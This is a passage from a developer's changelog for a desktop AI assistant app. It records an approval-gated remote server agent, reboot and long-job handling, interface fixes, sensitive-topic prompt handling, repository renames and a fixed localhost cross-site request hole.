  change: never end your own session; permissive change BEFORE the
  restrictive one; verify with a SECOND connection while the old path
  still works; arm an automatic revert (systemd-run/at/backgrounded
  sleep) that fires in 5-10 min unless confirmed; say what you're
  protecting against.
- INTERACTIVE FORM CARDS: the model ends a turn with a [[FORM]] trailer
  ({"q","multi","opts"}) and the reader answers by CLICKING — radios for
  one-of, checkboxes for many-of. The trailer is stripped from the prose;
  the answer posts as a normal user turn. TASK_GUIDE (server-side, added
  to Code-lane system prompts) teaches the voice: warm opener, ONE
  question per turn, forms only where options are small and discrete.
- MULTI-STEP BATCHING: the model may answer {"plan","cmds":[...]} for
  2-6 independent steps. ONE approval covers the batch, priced at its
  RISKIEST member (never averaged — verified), the card lists every
  command so a tap is never blind, and execution stops the moment a step
  fails. Single-command form unchanged.
- Verified live: 53/22 counts and category split; picker filtering +
  search; one-row chip trim with "⋯" always surviving; risk card gates
  (nothing sent), declines silently, proceeds on confirm; unflagged
  tasks bypass; form multi-select accumulates, radio replaces, answer
  posts as "Security, Low maintenance", card locks; [[FORM]] trailer
  parsed AND stripped from prose; batch parser + risk aggregation.
- rAF NEVER FIRES IN A HIDDEN DOCUMENT — the chip trim needed a
  setTimeout fallback beside requestAnimationFrame or it silently never
  ran in the Browser pane (same trap as the drawer transitions).
- Gauntlet 75/75.

## 6 beta 251 (pending) — live droplet shakeout + prereq cards
- DROPLET VERIFICATION of the 6b250 remote-agent work, and it earned its
  keep — two real bugs the live run caught, both fixed:
  1. _parse_action was REGEX-based and choked on the JSON the model
     legitimately produces — heredocs, [ini sections], {awk braces} in
     command strings truncated the match. Replaced with a balanced,
     string-aware brace scanner (_json_objects). 6/6 hard cases pass.
  2. A transient empty turn (cloud_text swallows a 429/timeout as "")
     used to END the whole run mid-task. Now the loop retries the turn
     up to 4x with backoff and, if it truly gives up, says "keep going"
     rather than dying silently.
- LOCKOUT RULE PROVEN IN THE WILD: asked to install fail2ban, the agent
  (Claude Sonnet 5) whitelisted the connecting IP in ignoreip FIRST and
  tried to arm an 8-minute systemd-run rollback timer — exactly the
  taught pattern. Independently verified on the box: fail2ban active,
  sshd jail protecting SSH (118 fails, 1 attacker already banned),
  ignoreip carries the SSH source IP, no rollback timer left armed.
- ARCHITECTURE ANSWER (per Patrick's gate): long jobs need NO install
  (systemd-run, present everywhere — the agent reached for it live);
  reboot survival's minimal form is Concorde-side reconnect, but the
  FOOLPROOF form wants a small server-side helper. So: yes, build the
  prereq card, scoped tightly to reboot/long-job tasks only.
- PREREQ CARD: a grey beetle (BUG_SVG) where the triangle was, a short
  why, then "Required tools" — each as a mono `name` + plain
  description (concorde-resume: reconnect after reboot; tmux: survive a
  dropped connection on a long step). Chained AFTER the risk card via a
  `stage` counter: risk -> prereq -> send. Only 3 tasks carry `req`
  (distro upgrade [reboot+long], SELinux/AppArmor [reboot], persistent
  mount [reboot]) — deliberately NOT overused for normal task packages.
- NOT YET BUILT (the actual parity engine): systemd-run long-job polling
  and the reconnect-after-reboot loop in run_remote_agent, plus the
  agent actually installing concorde-resume as its opening move. The
  card fronts this; the execution wiring is the next build, verifiable
  against the same droplet.
- Gauntlet 76/76.

## 6 beta 252 (pending) — the parity execution engine + prereq polish
- LONG-JOB ENGINE: ssh_run_long launches a command as a transient
  systemd-run unit (--collect, oneshot) — present on every systemd box,
  ZERO install — then polls is-active + journalctl tail until it settles
  and returns the real exit code + last log lines. Falls back to a plain
  long-timeout run where systemd-run is absent. The model marks a step
  {"long":true,...} and the loop routes it here, so a 30-min compile no
  longer hits the 120s per-command timeout.
- REBOOT SURVIVAL: a new {"reboot":"why"} action. Always gated (it drops
  the session). The loop issues a detached `systemctl reboot`, then
  ssh_wait_back polls up to 8 min until SSH answers again, reads the new
  kernel/uptime, and feeds "the box rebooted and is back" into the convo
  so the agent continues. Key insight, verified by the rebuild today: a
  REBOOT keeps the host key so accept-new reconnects cleanly; a REBUILD
  changes it and correctly refuses (different machine).
- PREREQ POLISH (per Patrick): tool descriptions shortened to one line
  at default width (measured 1 line each); .rkfoot padding 6/16/18 so
  the buttons aren't jammed in the corner; buttons are flex with an
  8px gap between a .rkemo span and the label (guaranteed spacing
  regardless of emoji width) — no longer "stuffed together".
- Unit-verified: parser understands {long}/{reboot}; ssh_run_long,
  ssh_wait_back, _shq present and correct. Gauntlet 76/76.
- STILL OWED — the live shakeout: a real long job (a compile under
  systemd-run) and a real reboot-and-resume against the droplet. Blocked
  only on the key: the rebuild wiped it, needs one ssh-copy-id. The
  concorde-resume helper the prereq card promises is not yet installed
  by the agent as its opening move — that's the last wire, best added
  once the live reboot loop is confirmed.

## 6 beta 252 (pending) — the prereq card is gone; the engine is zero-install
- DROPPED THE PREREQ CARD ENTIRELY (per Patrick: "so it's more
  seamless"). It promised the user we'd install `concorde-resume` and
  `tmux` — but the execution engine uses NEITHER. Long jobs ride
  systemd-run, which ships on every systemd box; reboot survival is
  Concorde-side polling. The card was asking permission for work that
  never happens, which is worse than no card at all.
  Removed: prereqCard(), PREREQ/PREREQ_WHY/BUG_SVG, the .prereqcard /
  .bugico / .reqlist CSS, the `req:` flags on the three tasks, and the
  stage-2 gate in startTask. startTask is back to ONE gate: the risk
  card. Gauntlet check inverted — it now asserts the prereq card can't
  creep back AND that systemd-run/ssh_wait_back are still in the source.
- FOUND VIA SCREENSHOT: three word-join bugs in the risk copy —
  "replacesthousands", "silentlyblock", "orUUID". My own earlier edits
  adding `req:` had eaten the trailing space at a string-concatenation
  boundary. Wrote a scanner that rebuilds every `w:` value the way JS
  concatenates it and flags letter-meets-letter across a boundary; 3
  found, 3 fixed, 0 remain. Worth re-running that scanner after any
  bulk edit of the task library.
- ENGINE PROVEN ON LIVE HARDWARE (rebuilt droplet, Ubuntu 26.04):
  * long job SUCCESS — a 180-SECOND job returned rc=0 with full output.
    That is 50% past the 120s per-command wall that would have killed
    it, which is the entire point of ssh_run_long.
  * long job FAILURE — a job exiting 42 surfaced rc=42, so failures
    aren't silently swallowed by the detach.
  * REBOOT SURVIVAL — issued the real reboot, reconnected in 36s,
    uptime 32 min -> 0 min, `who -b` confirms a fresh boot.
- The host-key subtlety worth remembering: a REBOOT keeps the host key
  so ssh_wait_back reconnects cleanly, but a REBUILD changes it and SSH
  correctly refuses (hit this when Patrick rebuilt the box — needed a
  manual ssh-keygen -R). That refusal is a feature, not a bug.
- Gauntlet 76/76.

## 6 beta 253 (pending) — one progress aesthetic, Claude-compacting-style
- Per Patrick: mimic Claude's compacting bar — thin, sharp, subtle
  pulsing glow. SIX bar families existed, all different (10px rounded,
  9px rounded, 5px bordered, 18px pill, two 3px). Now one look:
  2px inline / 3px panel, border-radius 0, hairline track at
  rgba(255,255,255,.07), flat #ecedf2 fill.
- THE SHIMMER IS RETIRED. The old bars swept a multi-stop gradient
  sideways (@keyframes skyshimmer), which reads as busy. Replaced with
  @keyframes barBreathe — a box-shadow glow rising and falling IN PLACE.
  Alive but calm, and it doesn't fight the text next to it. The orphaned
  skyshimmer keyframe was deleted, not left as dead CSS.
- METERS ARE THE ONE EXCEPTION, deliberately: the sidebar telemetry
  reads a LIVE VALUE, not progress toward a finish, so it gets the same
  thin/sharp treatment but a STEADY glow. Only bars that are actually
  working animate — otherwise the motion means nothing.
- FOUND WHILE PATCHING: .blendprog had TWO full track+fill rules; the
  second silently overrode the first, so its box-shadow glow had never
  rendered. Collapsed to one.
- Gauntlet 77/77 (new check asserts barBreathe exists AND skyshimmer is
  gone, so a bar can't quietly go back to sweeping).

## 6 beta 253 (cont.) — funnel decisions + the picker's sideways scroll
- THE FUNNEL LANE GETS DECISIONS, not questions (Patrick's 200-prompt
  set). 190 across 10 themed groups rotate one chip each — Daily, Home,
  Career, Money, Travel, Health, Relationships, Learning, Tech, Life
  Direction — trimmed to ONE row like the other lanes.
- THE STUCK GROUP IS PERSISTENT, not rotated (per Patrick's note): one
  of the 10 escape-hatch prompts is ALWAYS the last chip and always
  survives the trim, the way "⋯" does in the Code lane. Styled dashed
  and quieter with flex:0 0 auto, so it reads as a different KIND of
  affordance — "none of these" rather than an eleventh decision — and
  never steals width from the real ones.
- Clicking a funnel chip fills #fn-goal (emoji stripped) and fires
  #fn-go, so the chip IS the decision — nothing left to type.
- TENDER DECISIONS SHIFT THE FUNNEL FROM NARROWING TO SUPPORTING
  (Patrick flagged 105/109/113/125). Implemented SERVER-SIDE off the
  GOAL TEXT rather than as a tag on the canned chips, so someone who
  TYPES "should I leave my marriage" gets the same care as someone who
  clicked a suggestion — the tagged-chip version would have missed
  every real user in that moment. _TENDER_RX covers ending a
  relationship, seeing a clinician, mental health, substances,
  diagnoses and bereavement; FUNNEL_CARE tells the model to acknowledge
  the weight in one clause, frame options as ways to think rather than
  verdicts, always allow "gather more information / take time", refuse
  to diagnose, and keep the person's dignity. funnel_sys_for(goal) is
  the ONE place that decides, used by both call sites.
  Detector verified 27/27: fires on all four flagged items plus typed
  variants; stays quiet on dinner, laptops, rent, jobs, sleep, exercise
  and "should I end this subscription".
- THE TASK PICKER SCROLLED SIDEWAYS and the cause was a classic: a grid
  item's default min-width is auto = max-content, so a long task name
  with white-space:nowrap forced its column wider than its share.
  grid-template-columns:repeat(2,minmax(0,1fr)) lets the column shrink
  so the ellipsis does its job. Card widened 720 -> 940px too. Verified
  at 1440px: 53 rows, two full columns, scrollWidth == clientWidth,
  exactly one name still ellipsised.
- Gauntlet 80/80.

## 6 beta 253 (cont.) — the funnel lane gets decisions, not questions
- Patrick's 200-prompt set, verbatim, in 10 themed groups (Daily, Home,
  Career, Money, Travel, Health, Relationships, Learning 15, Tech 15,
  Life Direction) + a 10-strong "Situational & Stuck" pool. Verified
  the group sizes against his list: 20/20/20/20/20/20/20/15/15/20/10.
- ONE PER GROUP, SHUFFLED — never five dinner decisions in a row —
  then trimmed to a single row, same measure-and-trim as the Code lane.
- THE STUCK CHIP IS PERSISTENT (his note: surface it rather than
  rotate it). It's the escape hatch for a decision that's on no list,
  or that the person can't phrase yet, so it always survives the trim —
  and if IT wraps, decisions get dropped until it fits back up. Styled
  as a different KIND of offer: dashed, dimmer, flex:0 so it never
  stretches to fill the row like a real decision does.
- TENDER DECISIONS SHIFT FROM NARROWING TO SUPPORTING (his note on
  #105/#109/#113/#125). Detected from the GOAL TEXT, not from a tagged
  chip — so someone who TYPES "should I leave my marriage" gets the
  same care as someone who clicked a suggestion. That was the whole
  reason not to tag chips.
  FUNNEL_CARE tells the model to open by acknowledging the weight in
  one clause, frame options as ways to think rather than verdicts,
  offer "gather more information / take time / talk to someone
  qualified" as a real option, never diagnose, and keep the person's
  dignity. funnel_sys_for() is the ONE place it's applied, wired at
  both funnel entry points.
- Detection measured: 12/12 tender phrasings caught (incl. typed ones
  and "should I go back on my antidepressants"), 14/14 cold decisions
  left alone — including "stress test this server", which is why the
  pattern is `stress(?!\s*test)`: the Code lane shares this module.
- Gauntlet 80/80. (Deduped: I'd added a second copy of two funnel
  checks that already existed from before the session interruption.)

## 6 beta 254 (pending) — bottom-left rail: tighter, and a real memory read
- THE TOGGLE ROW RIDES DOWN to sit just above the monitor panel (per
  Patrick). #settings already had margin-top:auto pinning it to the
  bottom of the rail, so the fix was closing the gap UNDER it — padding
  14/6/4 -> 14/6/0 and #telemetry margin-top 12 -> 7. Measured: 26px
  gap -> 15px.
- MODELS -> MEMORY. And it is real memory PRESSURE on macOS, not
  "used": psutil's used% reads 43% on this Mac while actual pressure is
  19%, because macOS deliberately fills free RAM with cache. A meter
  wired to used% would sit near-red on a perfectly happy machine and
  mean nothing. mem_pressure() reads vm_stat and computes
  (wired + compressor) / total — the same quantity Activity Monitor
  gauges. Windows/Linux fall through to psutil used%, which IS the
  meaningful number there, and mem_label() names it honestly:
  "MEMORY PRESSURE" vs "MEMORY USED".
- Total RAM comes from `sysctl -n hw.memsize`, NOT psutil — vm_stat
  already supplies the page counts, so the whole mac path works on a
  bare install where psutil is missing.
- UNMEASURABLE RETURNS None, NEVER 0. A meter pinned at 0% would read
  as "no pressure at all" on a box that simply can't measure; the row
  hides instead. Verified by stubbing mem_pressure:null — row hides,
  then reappears with the real value when the stat returns.
- The ↑ "get more models" chip lived on the MODELS label and went with
  it. Its handler is now guarded rather than deleted, and the shortcut
  still exists in Settings › Download models and the MODELS AVAILABLE
  flag. Dead #models-up CSS removed; #mem-val is quiet mono with
  tabular-nums so the number doesn't jitter as it climbs.
- Gauntlet 81/81.

## 6 beta 255 (pending) — 150 new greetings, gated so they never lie
- Patrick's 150 NYC lines replace the old 110, with his key instruction
  built in: the Weather and Time groups only fire when they'd ring true.
  151 entries (148 lines; 3 appear twice, see the solar note below).
- GATED ON MONTH + HOUR + WEEKDAY, WHICH ARE FREE. A capability audit of
  the whole file settled the design: the app has NO idea where the user
  is — no IP-geo, no navigator.geolocation, no stored locality, not even
  a timezone. weather_snippets() derives its location by string-slicing
  the user's QUESTION and returns None without one, has zero caching,
  and an 8s timeout. Wiring that into first paint would mean an uncached
  blocking call to a rate-limited free service on every load AND every
  new chat, for a greeting. So live temperature is deliberately unused;
  the browser's own clock costs nothing and covers the real failure.
- EVERY TEMP CONDITION BECAME A MONTH WINDOW. Months, not seasons —
  "that April fake-out weather" gates to April alone (season would leak
  into March and May), "Rucker Park in July" to July, "sweater weather
  finally hit" to October (fall would still be firing in late November,
  six weeks after the arrival it claims).
- TWO LINES CUT, and only two: "First snow just hit" and "Rain's
  sideways, umbrella's toast". Both claim a PRECIPITATION EVENT, which
  no amount of calendar gating can fake — a dry January afternoon three
  weeks after the last flake would still say "first snow just hit".
  They come back the day the app has a real weather signal.
- THREE LINES ARE SPLIT IN TWO, on purpose: golden hour and sunset swing
  about four hours across the year (NYC sunset ~16:30 Dec, ~20:30 Jun),
  so one wide band would be wrong more often than right. Each gets a
  winter entry and a summer entry. "Whole weekend ahead" splits Friday
  evening / Saturday morning for the same reason.
- THE SWEEP FOUND WHAT THE BRIEF MISSED. Patrick flagged Weather and
  Time; 15 more lines across Transit, Bodega, Borough, Hiphop, Pop
  Culture and Sports carried hidden assumptions. Best catches:
  BROADWAY IS DARK ON MONDAYS (so "Broadway's dark tonight" is a Monday
  evening line, not an any-night one), the NYC Marathon closes streets
  on exactly the FIRST SUNDAY IN NOVEMBER (gated with a day-of-month
  window, 1.19% of slots — a deliberate annual easter egg), Summer Jam
  is a June concert, and "Got a seat on a Monday?" names its own day.
- THREE IMPLEMENTATION LANDMINES, all caught before shipping:
  1. `hour+day` tags carried the weekday in PROSE only — shipping that
     JSON verbatim would have fired "Friday at 4:58" every day at 4pm.
     Every day-bound line now carries an explicit `d` array.
  2. The one wrapping range (23->2) is unreachable under a naive
     `hr>=a&&hr<=b`. The test branches on a>b.
  3. `h:[0,0]` (midnight) vanishes under any `g.h[0] || fallback`
     idiom. Checks are explicit, never falsy.
- MEASURED, not assumed. Across all 2016 month x hour x weekday
  combinations: pool never drops below 104 lines (max 116), ZERO heat
  lines reachable in February, ZERO winter lines in July, and ZERO
  unreachable entries — every line has a moment. Midnight fires at 00
  and not 12; the wrap line fires at 23 and 01 and not 12; Friday fires
  Friday and not Tuesday; the Marathon fires Nov 2 but not Nov 16.
- Gauntlet 83/83.

## 6 beta 255 (cont.) — the last unverified link, and the 4 bugs it found
ANSWER: both protocols work. A live agent-driven run on the droplet
surveyed the box, ran the upgrade as a LONG job, emitted the REBOOT
action, waited, reconnected, verified health and reported — autonomously.
Confirmed independently on the box: uptime 0 min, fresh boot stamp,
is-system-running=running, 0 failed units, 0 pending upgrades, 0
leftover temp files.

But the FIRST run stalled, and chasing it found four real bugs — every
one of which made a SUCCESSFUL job look like a failure:
1. systemd-run WAITS on a Type=oneshot unit. Without --no-block the
   launch call blocked for the whole job, timed out at 30s, and the
   "systemd-run unavailable" fallback then ran the command a SECOND
   time, blocking, while the first copy was still going. On apt the
   twin hit the dpkg lock the original held and reported failure on an
   upgrade that had actually succeeded. On anything non-idempotent it
   would have done the work twice for real. Proven with a counter file:
   body ran twice before, exactly once after.
2. The fallback now ASKS THE BOX whether the unit exists before
   re-running. A launch that merely timed out has still started the job.
3. --collect garbage-collects the unit the instant it exits, so
   ExecMainStatus read back as systemd's DEFAULT of 0 and every failure
   reported success. (The earlier "exit 42 OK" was the blocking
   fallback working, masking this.) The job now writes its own exit
   code to a file, immune to the unit lifecycle.
4. `{ cmd ; }` is a brace group in the CURRENT shell, so a command
   ending in `exit 33` killed the wrapper before it could record the
   code. A subshell `( cmd )` contains the exit. Verified: exit 33 -> 33,
   grep-no-match -> 1, success -> 0, single-quoted cmd -> 0.
- THE STALL ITSELF was two separate things. claude-sonnet-5 emits a
  `thinking` block and max_tokens covers reasoning AND answer, so a turn
  that thinks hard can return NO text block — cloud_text saw "", called
  it "returned nothing", and RESTED A HEALTHY KEY for ten minutes. It
  now returns "" quietly when stop_reason is max_tokens (our budget, not
  their fault), the agent starts at 8000 and escalates 6000 per retry.
  The rest was plain 429s from hammering one provider; backoff went from
  1.5-4.5s (useless against a rate limit) to 4/12/25/40s, and the driver
  is RE-RESOLVED between retries so a rested provider hands off to the
  next on the bench.
- Gauntlet 85/85.

## Repo renamed: bigmillz/MillenAI -> bigmillz/concorde (2026-08-22)
- Surfaced during the 6b255 push ("remote: This repository moved").
  GitHub's redirect meant nothing broke loudly — which is exactly why a
  stale reference could have sat unnoticed for months.
- FOUR places repointed, and the important one was NOT the obvious one:
  * millenai.py UPDATE_REPO — the IN-APP UPDATER. Every installed
    desktop copy checks GitHub releases through this constant, so a
    stale value here is the one that eventually strands users.
  * go-live.sh REPO — how the hosted :9889 instance self-updates.
  * git remote origin.
  * ~/Library/MillenAI-live/repo's own origin (the live clone).
  The GitHub Actions workflow needed nothing — it uses
  $GITHUB_REPOSITORY and follows the rename by itself.
- VERIFIED under the new name, not assumed: /releases/latest returns
  v197 (correct — `latest` excludes prereleases, which is the beta-hold
  behaviour), the prerelease list returns v255/254/253, git fetch is
  0/0, the live updater ran clean and :9889 still serves beta 255, and
  /api/update/check reports tag v255 with available:false.
- The local checkout is still `My Drive/Downloads/files` and the main
  file is still millenai.py — only the remote changed. Older NOTES
  entries and memory files saying "MillenAI" mean this same project.

## Renamed: Concorde -> ConcordeAI; repo -> bigmillz/concordeai (2026-08-22)
- THE BRAND GREW ITS AI, AND THE AI IS BOLD (per Patrick). APP_NAME is
  "ConcordeAI"; the three lockups (sidebar .vghost, Settings
  #set-brand, wizard #wiz-brand) hand-split the mark as
  Concorde<b>AI</b> inside the styled outer <b> — nested, because the
  gauntlet's tab guard forbids a span holding a bare AI (a CSS comment
  SPELLING that forbidden literal shipped in the page and tripped the
  guard itself; reworded). One shared rule bolds all three (.vghost
  b b etc.); Michroma is single-weight, the 700 is synthesized. The
  sign-in and gate pages carry the same split h1. Everything
  load-bearing keeps MillenAI: app_dir, bundle id, executable
  (_SWAP_SCRIPT pgreps it), cookies, millen.* localStorage.
- ARTIFACTS RENAMED, IDENTITIES PINNED: ConcordeAI.app (CFBundleName/
  DisplayName only), "ConcordeAI x.y.z.dmg", ConcordeAI-*-Windows.zip
  (in-zip folder and .bat renamed too), ConcordeAI-*-x64.msi (WiX
  Product/shortcuts renamed; UpgradeCode, INSTALLDIR and HKCU keys stay
  MillenAI so upgrades land in place; Inno gets an explicit
  AppId=MillenAI for the same reason). The DMG background draws
  CONCORDEAI: tracking still derives from the measured 8-letter ink
  width, total ink is computed rather than assumed, and the AI pair
  gets a same-color stroke — PIL's synthetic bold.
- REPO RENAMED bigmillz/concorde -> bigmillz/concordeai (gh repo
  rename; origin repointed itself). UPDATE_REPO and go-live.sh
  repointed. VERIFIED: the old API URL 301s, and /api/update/check
  against the renamed repo resolves v256 — pre-rename installs keep
  updating through the redirect, same as the MillenAI rename before it.
- AUTO UPDATE CHECK HARDENED (per Patrick: leaving the app open must
  not mean falling behind). The hourly checkUpdate() poll already
  shipped; what it lacked was guards. Now: IS_LOCAL only (the install
  POST 403s for tunnel visitors, whose dialog then hung at
  "Downloading…" forever), hidden windows skip the tick (the
  pollEngines idiom) and settle up on visibilitychange, and the server
  answers pollers from a 15-min cache — failures never cached (a DNS
  blip must not read as "no update"), cache keyed to the beta pref,
  and the Settings button sends ?force=1 for a real hit.
- FUNNEL: A TYPED ANSWER IS AN ANSWER (per Patrick — typing "a new
  apartment" at stage 1 fell to /api/chat and produced a wall of
  generic prose, stranding the funnel). The card-click body is now a
  shared fnAnswer(label); send() routes funnel-lane text into it, or
  starts a funnel with it on the lane's blank slate. Review caught two
  regressions in the first cut, both fixed and re-verified: 1. a
  funnel abandoned by switching chats stayed armed and a later typed
  answer advanced it into whichever chat was on screen — fnState is
  now tagged with its chat and cleared on loadChat/new/delete; 2. in a
  FINISHED funnel chat, typed follow-ups were hijacked into a nonsense
  new funnel — they now fall through to /api/chat, where the finished
  funnel is the subject (6b238). A stage error abandons the funnel
  instead of dead-ending the composer; typed picks are collapsed to
  one line so _FUNNEL_PICK_RX can read them back.
- SAY IT ONCE, AGAIN (per Patrick: "once the query is done ... it's
  redundant"): reloaded answers prepended a loose srcRow above the
  prose while live answers fold chips into the disclosure (6b242).
  addMsg now folds them into the same collapsed box (srcBox, "N
  sources" with the chevron) — no path renders a bare chips row.
- Gauntlet 89/89 (85 -> 89: four new checks — bold-AI lockup, guarded
  auto-update, funnel typed answers, sources-fold — and the brand
  check now also forbids bare "Concorde" outside the split lockup).

## 6 beta 257 (pending) — the platform line that nobody ever saw
- THE about-name ID IS RETIRED. It existed THREE times (both veil
  titles + the Settings rail lockup — the duplicate-id trap this log
  has recorded three separate times), and the pre-rail About code
  still wrote to it: the platform line ("ConcordeAI Apple Silicon")
  landed on the FIRST match — the new-models veil title — where
  announceModels' own properly-scoped rewrite papered over it. Dead
  UI for many builds; surfaced by an adversarial review of the rename
  diff and confirmed pre-existing via git history, not a rename
  regression.
- The fix is deletion (the 6b245 lesson): the rail already reports
  the machine in #set-spec (chip / memory / accel), so the platform
  write is gone; the veil titles carry distinct ids (new-title /
  up-title sharing one title rule), the rail lockup is just
  #set-brand b, and the stale pre-rail rules died with the id — no
  rule or query names it anywhere now.
- VERIFIED over the wire: the served page has zero occurrences of the
  old id in any form, both veils still title correctly, and the
  Concorde<b>AI</b> lockup is untouched. One run tripped on an
  unrelated transient (ConnectionResetError reading a 403 body in the
  remote-lockdown probe; clean on re-run).
- Gauntlet 90/90 (+1: about-name id retired, veil titles distinct).

## 6 beta 257 (cont.) — the stream got manners, and an Answer now button
- SPINNER-FIRST (per Patrick: "get rid of that pulsing grey
  rectangle"). The caret is retired — a stream opens on the quiet
  statusline pinwheel, and the whole machinery card (bar, steps) holds
  back for the run's first 5 seconds behind a .warm class that
  paintSteps lifts; a quick answer never shows its workings, a slow
  one fades the card in. A sibling rule hides the boot spinner the
  moment the card is showing, and collapseSteps clears .warm so a
  sub-5s answer still gets its fold.
- SMOOTH BAR + TIME LEFT (per Patrick). The honest-progress math
  (6b226) is unchanged and became the TARGET; what the bar SHOWS is a
  time-based tween easing toward it, so a landed milestone pulls the
  bar over ~a second instead of teleporting. The real fix was found by
  measuring WHY the CSS transition never ran: paintSteps rewrote
  box.innerHTML every 600ms, recreating the <i> each time — there is
  now an in-place fast path (same rows -> only .wtbar i width + the
  eta text change) on a 200ms clock, so the width transition finally
  animates. Under the bar: "~40s left" in italic grey — this run's
  pace blended 55/45 with a per-tier EMA in millen.speeds (new
  localStorage key), shown only past 5s with >=3s left; hurried and
  aborted runs don't feed the EMA (they lie about the tier).
- ANSWER NOW (per Patrick: "take a clue from Gemini"). /api/chat
  ships an unguessable X-Hurry id and parks an Event in _hurry_jobs;
  POST /api/chat/hurry sets it (not admin-gated — the id is the
  authorization, the APPROVE-jid trust model). run_council checks it:
  skips not-yet-started local models (the first always commits),
  joins the running one in 0.5s slices, shortens the cloud join to
  5s, skips peer review and reflection, and hands the merge to
  fast_cloud_ladder() when 2+ real drafts exist — the fastest pen,
  which is what the button promised. Registry popped in the handler's
  finally (mint verified to sit BEFORE the owning try, so the pop can
  never NameError). Client: an "Answer now" ghost button beside the
  time-left line, armed only once a REAL draft arrived (liveDrafts
  counts non-"(no answer" chips), delegated from the chat container
  like the chevron; on click it greys to "Hurrying it along…".
- SEAMLESS DARK TITLE BAR (per Patrick: "like we did for the vpn
  app"). The cooperative recipe ported back from ConcordeVPN — which
  credits this file's cocoa pattern, so the trick has now crossed the
  fence twice: transparent titlebar, hidden title, DarkAqua, window
  background matched to the page, and NO fullSizeContentView (content
  under the bar kills window drag and summons WebKit's scroll-pocket
  tint — their live findings, inherited here for free). The wipe's
  _resolidify now paints #0a0a0c instead of 0x212121 — with a
  transparent bar that color IS the bar — and re-runs the chrome
  pass; one extra 0.8s pass catches pywebview's post-init chrome
  touch.
- VERIFIED over the wire: caret absent from the page, warm/tween/eta
  markers served, /api/chat answers with a live X-Hurry header, and
  a bogus hid gets {"ok": false}.
- Gauntlet 94/94 (+4: spinner-first, smooth bar + time-left, Answer
  now, seamless title bar).

## 6 beta 257 (cont.) — settings round two, and the door nobody had locked
- SIX PANES, SIX DESCRIPTIONS (per Patrick's concept picks): every
  pane opens with one quiet .tdesc line in one voice. Written in the
  template as "MillenAI" so brand() rewrites them — the tokens must
  never be hard-coded to the brand.
- ACCOUNT PANE, FIRST IN THE RAIL. New GET /api/me answers
  owner|google|guest|pin — and it HAD to be given something to read:
  the uid is a one-way sha256, so how you signed in was unrecoverable.
  A .ident marker (kind + email or name, never a PIN) is now written
  at mint time in the Google callback and /api/welcome; guests already
  had .guest, whose mtime yields the remaining hours for free. Old
  profiles report "pin" — google and pin were always indistinguishable,
  so nothing is lost. POST /api/logout clears the cookie (hidden for
  the cookieless desktop owner).
- FORGET ME NOW MEANS IT (per Patrick: the droplet-destroy treatment).
  It cleared MEMORIES ONLY before while promising everything. Three
  locks: pick the scopes (memories / chats / personal settings), prove
  it's you (owner PIN when owner access is configured), then type
  FORGET ME in caps. Scoped POST /api/forget does the work; the owner's
  prefs are key-stripped, never deleted (turbo, contribute and the
  update channel are machine config, not "about the user"), and a full
  three-scope forget on a walled profile takes the .ident marker with
  it — the review caught that /api/me still greeted you by name after
  "Erase forever".
- THE COMMUNITY PANE STOPPED LYING. The tooltip has promised "nothing
  runs while you are using it" since it shipped; NOTHING enforced it.
  Now: an AC gate (psutil battery, and None — a desktop — counts as
  plugged in), an idle gate (ioreg HIDIdleTime, 120s, and unmeasurable
  means the gate opens), and a duty cycle that rests the complement of
  the lend share after each job. It is a share of TIME, labelled as
  such: MLX and Ollama expose no instantaneous GPU throttle, so a "max
  GPU %" slider would have been a fake control. The hub needs no
  change — a resting worker ages out of the 45s liveness window on its
  own. A ledger (contrib_ledger.json, its own file: prefs.json is
  rewritten wholesale by the settings UI and would race the worker)
  counts jobs, seconds and characters, and REPLACES "Contributing to N
  users" — which read the LOCAL machine's user count, ~always 1, and
  had lied politely for months. "Users helped" is still not knowable
  worker-side (the job payload carries no requester) so it is not
  shown; the gauntlet now forbids the old line's return.
- MODELS ROSTER (option B, per Patrick): one mono line per mind —
  status, size, and what it's FOR, read from ADV_USE, the same dict
  the Advanced picker uses, so the two can never drift. Manage adds
  tick-to-install, the Minimal/Recommended/Maximum cards (the exact
  plans first-run already offers) and per-row removal. Removal is the
  only genuinely new destructive surface: admin-gated, refuses a model
  that is mid-download (there is no cancel machinery and rmtree under
  a live writer resurrects partial state), stops the MLX engine under
  _engine_lock before deleting EXACTLY the label's own HF cache dir
  pair derived from MLX_REPOS — never a glob, never the shared hub/
  parent — and asks the Ollama daemon rather than touching ~/.ollama,
  whose blobs are content-addressed and shared across tags. A non-zero
  `ollama rm` now raises instead of reporting success.
- UPDATES WEARS ITS VERSION: the number centred in the display face,
  "Released on August 22, 2026" under it, and the release notes card —
  the GitHub release body was already travelling in the update-check
  response and was simply thrown away. Every release we cut from here
  gets a human bullet list, so the card fills itself.
- YOUR NAME: the first field in Personality, saved with the persona
  and injected ONCE into the system-prompt assembly every model reads,
  stated to outrank a remembered name (MEMORY_PROMPT extracts one too).
  The prefs read there was hoisted so the name costs no extra disk hit.
- THE DOOR NOBODY HAD LOCKED. The adversarial review found the real
  bug of this round, and it predates it: THE OWNER HAS NO COOKIE —
  they are authenticated by the mere ABSENCE of proxy headers — so
  SameSite protects them from nothing, and any page in any browser
  could POST to 127.0.0.1 and erase chats or delete multi-GB weights.
  Verified live: a text/plain form-smuggled POST was accepted. Writes
  now demand a same-origin Origin (browsers attach one to every
  cross-site POST, forms included), refuse the three form content
  types, and refuse a Host that isn't localhost (DNS rebinding).
  Native callers — curl, turbo.sh, the fleet workers, the gauntlet —
  send no Origin and a JSON content type, so nothing legitimate
  noticed. FOUR live probes are now gauntlet checks.
- ALSO FROM THE REVIEW: the contribute loop carries a GENERATION
  token — the stop Event alone could not retire a loop stuck mid-job
  (contrib_apply gives up after 3s and then CLEARS the flag for the
  new thread, and the old one sails on), so flipping a toggle during a
  job left two loops polling the same hub. A valid-JSON non-object
  body used to reach .get() and 500 three handlers. #up-detail was on
  BOTH veils, so the update dialog's "Downloading…" landed in the
  hidden new-models card — the FOURTH time the duplicate-id trap has
  been paid for in this file. And a bare `#fleet-box input` rule
  stretched the new checkboxes to full width.
- KNOWN AND ACCEPTED: a second live session can autosave its stale
  chat list back after a forget. Single-window desktop is the norm and
  tunnel users have their own profiles; cross-session invalidation
  would cost more machinery than the case is worth. Say it out loud
  rather than pretend.
- Gauntlet 108/108 (+9: descriptions/Account/scoped forget, honest
  ledger + real gates, roster + manage, updates face, the name, four
  CSRF probes, generation token, marker removal, honest removal).

## The sync droplet: zero-knowledge accounts (2026-08-22)
- THE BOX: concordeai-db, Ubuntu 26.04, NYC3, $6/mo. The $4 tier was
  refused on purpose — password stretching is memory-hard by design,
